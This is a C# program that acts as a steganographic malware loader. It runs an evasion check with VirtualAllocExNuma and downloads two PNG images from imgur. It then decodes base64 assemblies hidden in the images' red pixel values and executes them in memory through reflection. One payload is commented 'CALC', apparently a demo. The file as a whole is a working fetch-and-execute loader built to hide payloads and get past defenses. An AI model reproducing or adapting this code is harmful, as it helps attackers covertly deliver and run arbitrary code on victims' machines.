using System;
using System.Drawing;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;

namespace imgc
{
    class Program
    {
        [DllImport("kernel32.dll")]
        private static extern int VirtualAllocExNuma(IntPtr hProcess, int lpAddress, int dwSize, int flAllocationType, int flProtect, int nndPreferred);

        static void Main(string[] args)
        {
           
            object mem = null;
            mem = VirtualAllocExNuma(System.Diagnostics.Process.GetCurrentProcess().Handle, 0, 1000, 0x00002000 | 0x00001000, 0x40, 0);

            if (mem != null)
            {

                Console.WriteLine("Downloading files...");

                string loader = @"http://i.imgur.com/y66QVE2.png"; // No Startup                                
                string file = @"http://i.imgur.com/zN07hYc.png"; //CALC                
                var requestLoader = WebRequest.Create(loader);
                var requestFile = WebRequest.Create(file);
                Bitmap loaderIMG;
                Bitmap fileIMG;

                Console.WriteLine("Downloading Loader...");
                using (var response = requestLoader.GetResponse())
                using (var stream = response.GetResponseStream())
                {
                    loaderIMG = (Bitmap)Image.FromStream(stream);
                }

                Console.WriteLine("Downloading File...");
                using (var response = requestFile.GetResponse())
                using (var stream = response.GetResponseStream())
                {
                    fileIMG = (Bitmap)Image.FromStream(stream);
                }

                Console.WriteLine("Depixelating...");

                Console.WriteLine("Depixelating Loader...");
                byte[] outputLoader = depixelate(loaderIMG);

                Console.WriteLine("Depixelating File...");
                byte[] outputFile = depixelate(fileIMG);

                Console.WriteLine("Running...");
                System.Reflection.Assembly.Load(outputLoader).GetType("Loader.Loader").GetMethod("RunProgram").Invoke(null, new object[] { outputFile });
                                               
            }
        }

        public static byte[] depixelate(Bitmap img)
        {
            StringBuilder holder = new StringBuilder();
            int xmax = img.Width - 1;
            int ymax = img.Height - 1;
            for (int y = 1; y <= ymax; y++)
            {
                for (int x = 1; x <= xmax; x++)
                {                    
                    Color c = img.GetPixel(x, y);
                    holder.Append((char)c.R);
                }
            }

            return Convert.FromBase64String(holder.ToString().Replac​e(Convert.ToChar(0).ToString(), ""));
        }
    }

}
